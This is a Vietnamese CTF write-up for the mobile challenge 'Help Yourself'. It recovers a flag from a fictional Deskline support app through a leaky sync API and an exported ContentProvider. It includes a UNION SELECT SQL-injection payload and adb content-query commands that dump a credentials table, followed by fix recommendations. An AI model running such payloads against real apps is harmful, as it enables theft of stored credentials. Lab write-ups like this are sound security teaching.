# Help Yourself — Deskline

**Challenge:** Help Yourself  
**Category:** Mobile / Docker  
**Points:** 63  
**Target:** `https://web-94f53979ce6ad619.web.h7tex.com/`  
**APK:** `deskline-1.6.0.apk`

---

## 1. Overview

Challenge mô tả một hệ thống support desk tên **Deskline**, trong đó có một note đặc biệt đánh dấu `agent-only`.

Mục tiêu là tìm cách truy cập dữ liệu nội bộ mà giao diện bình thường không hiển thị.

Sau khi phân tích APK, có thể xác định ứng dụng sử dụng API:

```text
POST /api/v1/auth/device
GET  /api/v1/sync
```

và backend trả về trực tiếp một object `internal` ngoài danh sách `tickets`.

Kết quả khai thác thực tế:

```json
{
  "internal": {
    "label": "vault-unseal-code",
    "value": "H7CTF{900b4286-adbf-4506-95c7-9c7e674799d4}"
  }
}
```

Flag:

```text
H7CTF{900b4286-adbf-4506-95c7-9c7e674799d4}
```

---

# 2. Reconnaissance

Mở target:

```text
https://web-94f53979ce6ad619.web.h7tex.com/
```

Server xác định chính nó là:

```text
Deskline Agent API
Version: 1.6.0
```

Do challenge thuộc nhóm **Mobile**, APK là nguồn thông tin quan trọng nhất.

Các string đáng chú ý trong APK:

```text
/api/v1/auth/device
/api/v1/sync
Deskline-Android/1.6.0
X-Deskline-Client
TicketProvider
rawQuery
credentials
deskline.db
```

Từ đó có thể dựng được attack surface:

```text
Android APK
   |
   +-- Authentication API
   |      |
   |      +-- /api/v1/auth/device
   |
   +-- Sync API
   |      |
   |      +-- /api/v1/sync
   |
   +-- Local SQLite
          |
          +-- tickets
          +-- credentials
          |
          +-- TicketProvider
```

---

# 3. Reverse APK

Giải nén APK:

```bash
unzip deskline-1.6.0.apk -d deskline
```

Có thể tìm các string quan trọng bằng:

```bash
strings deskline/classes.dex | grep -Ei \
'auth/device|sync|TicketProvider|rawQuery|credentials|sqlite|deskline'
```

Các class/API đáng chú ý:

```text
com.deskline.TicketProvider
/api/v1/auth/device
/api/v1/sync
```

Ứng dụng có cơ chế đồng bộ dữ liệu từ server xuống local database.

---

# 4. Authentication flow

Ứng dụng tạo một device ID:

```text
dsk-<UUID>
```

Ví dụ:

```text
dsk-79071267-e9a3-458c-b62e-a86492edef0b
```

Sau đó gửi:

```http
POST /api/v1/auth/device
Content-Type: application/json
```

Body:

```json
{
  "device_id": "dsk-79071267-e9a3-458c-b62e-a86492edef0b"
}
```

Server trả về:

```json
{
  "agent": "Marcus Hale",
  "token": "JWT..."
}
```

Trong lần khai thác thực tế:

```text
[+] auth: HTTP 200
{"agent":"Marcus Hale","token":"eyJhbGciOiJIUzI1NiIs..."}
```

Như vậy authentication không yêu cầu username/password mà chỉ dựa trên `device_id` được client tạo ra.

---

# 5. Sync API

Sau khi có JWT token, client gọi:

```http
GET /api/v1/sync
Authorization: Bearer <TOKEN>
X-Deskline-Client: Deskline-Android/1.6.0
```

Kết quả thực tế:

```json
{
  "internal": {
    "label": "vault-unseal-code",
    "value": "H7CTF{900b4286-adbf-4506-95c7-9c7e674799d4}"
  },
  "tickets": [
    {
      "body": "Customer locked out after 3 tries.",
      "subject": "Cannot reset password"
    },
    {
      "body": "Order #55120, refund pending 8 days.",
      "subject": "Refund not received"
    },
    {
      "body": "Repro: attach >10MB photo, force close.",
      "subject": "App crashes on upload"
    },
    {
      "body": "Requests move to new corporate domain.",
      "subject": "Change billing email"
    }
  ]
}
```

Đây là bước quyết định: server **đã gửi dữ liệu `internal` cho client**.

Trong khi giao diện chính chỉ cần dữ liệu:

```json
"tickets": [...]
```

thì object:

```json
"internal": {...}
```

không được hiển thị rõ trong UI.

---

# 6. Hidden internal data

Object quan trọng là:

```json
"internal": {
  "label": "vault-unseal-code",
  "value": "H7CTF{900b4286-adbf-4506-95c7-9c7e674799d4}"
}
```

Tên:

```text
vault-unseal-code
```

cho thấy đây là một giá trị nội bộ.

Điểm cần chú ý là client không chỉ nhận ticket mà còn nhận secret nội bộ.

Điều này dẫn đến hai hướng phân tích:

```text
Hướng 1:
Khai thác API trực tiếp
        |
        v
GET /api/v1/sync
        |
        v
internal.value
```

hoặc:

```text
Hướng 2:
APK
 |
 v
Local SQLite
 |
 v
ContentProvider
 |
 v
SQL Injection
 |
 v
credentials
```

Trong challenge này, API trực tiếp đã đủ để lấy flag.

---

# 7. Local SQLite analysis

APK có database:

```text
deskline.db
```

và các bảng liên quan:

```sql
CREATE TABLE tickets (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    subject TEXT,
    body TEXT
);
```

cũng như:

```sql
CREATE TABLE credentials (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    label TEXT,
    value TEXT
);
```

Ý tưởng ban đầu là dữ liệu `internal` có thể được lưu trong bảng:

```text
credentials
```

Điều này phù hợp với `label/value`:

```text
label = vault-unseal-code
value = H7CTF{...}
```

---

# 8. Exported ContentProvider

APK khai báo:

```text
com.deskline.TicketProvider
```

với authority:

```text
com.deskline.tickets
```

và provider được export:

```xml
android:exported="true"
```

Điều này mở một IPC interface cho caller bên ngoài ứng dụng.

Ta có:

```text
adb / another application
             |
             v
content://com.deskline.tickets/...
             |
             v
TicketProvider
             |
             v
SQLite
```

---

# 9. SQL Injection trong TicketProvider

Điểm đáng chú ý nhất khi reverse `TicketProvider` là cách xây dựng SQL.

Logic tương đương:

```java
String sql = "SELECT id, subject, body FROM tickets";

if (selection != null && selection.trim().length() > 0) {
    sql += " WHERE " + selection;
}

return db.rawQuery(sql, null);
```

Ở đây:

```java
sql += " WHERE " + selection;
```

cho phép caller kiểm soát trực tiếp phần `WHERE`.

Đây là **SQL Injection**.

Không có prepared statement hay `selectionArgs` để parameterize dữ liệu.

---

# 10. UNION SELECT payload

Query gốc:

```sql
SELECT id, subject, body
FROM tickets
WHERE <selection>
```

Payload:

```text
1=0 UNION SELECT id,label,value FROM credentials --
```

Sau khi ghép vào câu SQL:

```sql
SELECT id, subject, body
FROM tickets
WHERE 1=0
UNION
SELECT id, label, value
FROM credentials
--
```

Giải thích:

```text
1=0
```

loại bỏ tất cả ticket bình thường.

Tiếp theo:

```sql
UNION SELECT id,label,value FROM credentials
```

đưa dữ liệu từ `credentials` vào kết quả.

Ba cột được map như sau:

```text
credentials.id     -> id
credentials.label  -> subject
credentials.value  -> body
```

Nếu bảng có:

```text
label = vault-unseal-code
value = H7CTF{...}
```

thì provider sẽ trả về secret như một ticket.

---

# 11. Exploit bằng ADB

Sau khi cài APK và sync dữ liệu:

```bash
adb install deskline-1.6.0.apk
```

Có thể kiểm tra provider:

```bash
adb shell content query \
  --uri content://com.deskline.tickets/tickets
```

Payload SQL injection:

```bash
adb shell content query \
  --uri content://com.deskline.tickets/tickets \
  --where "1=0 UNION SELECT id,label,value FROM credentials --"
```

Có thể giới hạn vào entry cụ thể:

```bash
adb shell content query \
  --uri content://com.deskline.tickets/tickets \
  --where "1=0 UNION SELECT id,label,value FROM credentials WHERE label='agent-only' --"
```

Lưu ý: trong instance thực tế này, `sync` trả về:

```text
label = vault-unseal-code
```

vì vậy khi lọc theo label nên dùng:

```bash
adb shell content query \
  --uri content://com.deskline.tickets/tickets \
  --where "1=0 UNION SELECT id,label,value FROM credentials WHERE label='vault-unseal-code' --"
```

---

# 12. Nhưng đường khai thác thực tế đơn giản hơn

Sau khi viết script gọi API, không cần đi qua `ContentProvider`.

Script thực hiện:

```text
Generate device_id
       |
       v
POST /api/v1/auth/device
       |
       v
JWT token
       |
       v
GET /api/v1/sync
       |
       v
internal.value
```

Kết quả chạy thực tế:

```text
[+] Target: https://web-94f53979ce6ad619.web.h7tex.com
[+] Device: dsk-79071267-e9a3-458c-b62e-a86492edef0b
[+] auth: HTTP 200

{"agent":"Marcus Hale","token":"..."}

[+] sync: HTTP 200

{"internal":{"label":"vault-unseal-code","value":"H7CTF{900b4286-adbf-4506-95c7-9c7e674799d4}"},"tickets":[...]}
```

Sau đó script in:

```text
[+] internal:
{
  "label": "vault-unseal-code",
  "value": "H7CTF{900b4286-adbf-4506-95c7-9c7e674799d4}"
}
```

và xác định flag:

```text
H7CTF{900b4286-adbf-4506-95c7-9c7e674799d4}
```

---

# 13. Exploit chain thực tế

Có thể mô tả đường khai thác ngắn gọn:

```text
               Deskline API
                    |
                    v
        POST /api/v1/auth/device
                    |
                    v
                  JWT
                    |
                    v
             GET /api/v1/sync
                    |
          +---------+---------+
          |                   |
          v                   v
       tickets             internal
                              |
                              v
                  vault-unseal-code
                              |
                              v
             H7CTF{900b4286-adbf-4506-95c7-9c7e674799d4}
```

Nếu đi theo hướng reverse sâu hơn:

```text
APK
 |
 +--> Sync
 |
 +--> SQLite
       |
       +--> credentials
       |
       +--> TicketProvider
              |
              +--> exported=true
              |
              +--> unsanitized selection
              |
              +--> rawQuery()
              |
              +--> UNION SELECT
```

---

# 14. Root cause

Có hai vấn đề bảo mật đáng chú ý.

## 14.1 Sensitive data được gửi xuống client

Server trả:

```json
"internal": {
    "label": "vault-unseal-code",
    "value": "H7CTF{...}"
}
```

Nếu giá trị này thực sự là secret chỉ dành cho agent, việc gửi nó cho client không đáng tin cậy đã phá vỡ ranh giới bảo vệ.

Nguyên tắc cần nhớ:

> Nếu client nhận được secret, client có thể bị reverse-engineer và secret có thể bị trích xuất.

---

## 14.2 ContentProvider cho phép SQL Injection

Đoạn code:

```java
sql += " WHERE " + selection;
```

là nguồn gốc của SQL injection.

Đồng thời:

```xml
android:exported="true"
```

làm tăng phạm vi khai thác vì provider có thể được truy cập từ bên ngoài.

---

# 15. Secure coding recommendations

## Không export provider khi không cần

Thay:

```xml
android:exported="true"
```

bằng:

```xml
android:exported="false"
```

nếu provider chỉ phục vụ nội bộ ứng dụng.

Nếu cần export, phải dùng permission thích hợp.

---

## Không nối SQL bằng string

Không nên:

```java
String sql =
    "SELECT id, subject, body FROM tickets WHERE " + selection;

db.rawQuery(sql, null);
```

Nên sử dụng API có parameter binding:

```java
db.query(
    "tickets",
    new String[]{"id", "subject", "body"},
    "subject = ?",
    new String[]{subject},
    null,
    null,
    null
);
```

---

## Không gửi secret xuống mobile client

Thay vì:

```json
{
  "internal": {
    "label": "vault-unseal-code",
    "value": "SECRET"
  }
}
```

server chỉ nên trả dữ liệu mà client thực sự cần.

Các secret server-side phải được giữ ở server và chỉ dùng sau khi xác thực/ủy quyền đúng cách.

---

# 16. Final flag

```text
H7CTF{900b4286-adbf-4506-95c7-9c7e674799d4}
```

---

# 17. TL;DR

Challenge có thể giải rất nhanh bằng cách reverse API flow của APK.

### Bước 1

Sinh device ID:

```text
dsk-<UUID>
```

### Bước 2

Gửi:

```http
POST /api/v1/auth/device
```

### Bước 3

Lấy JWT.

### Bước 4

Gửi:

```http
GET /api/v1/sync
Authorization: Bearer <JWT>
X-Deskline-Client: Deskline-Android/1.6.0
```

### Bước 5

Đọc:

```json
internal.value
```

### Flag

```text
H7CTF{900b4286-adbf-4506-95c7-9c7e674799d4}
```

### Lỗ hổng phụ/đường khai thác sâu

```text
exported ContentProvider
        +
unsanitized SQL selection
        +
SQLite UNION SELECT
        =
local database disclosure
```

---

## Tools hữu ích

```bash
apktool d deskline-1.6.0.apk
jadx -d deskline-src deskline-1.6.0.apk
strings classes.dex
adb install deskline-1.6.0.apk
adb shell content query ...
```

Có thể dùng JADX/Apktool để xác định API, manifest, ContentProvider và SQL logic trước khi viết exploit script.
